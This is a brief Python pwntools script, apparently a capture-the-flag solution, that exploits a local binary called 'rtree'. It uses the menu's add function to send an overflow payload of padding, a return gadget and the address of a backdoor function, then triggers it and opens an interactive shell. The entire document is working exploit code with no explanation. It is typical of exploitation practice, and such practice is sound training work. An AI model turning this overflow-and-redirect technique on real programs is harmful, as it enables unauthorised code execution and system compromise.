from pwn import *

p = process("./rtree")
context(os="linux", arch="amd64", log_level="debug")

def add(key, size, data):
    p.sendlineafter(">> \n", "1")
    p.sendlineafter("key:", str(key))
    p.sendlineafter("data", str(size))
    p.sendafter("data:", data)

backdoor = 0x40122C
ret = 0x4015ED
payload = b"a" * (0x200 - 0x10) + p64(ret) + p64(backdoor)
add(1, 0x200 - 24, payload)
# gdb.attach(p)
# pause()
p.sendlineafter(">> \n", "4")
p.interactive()
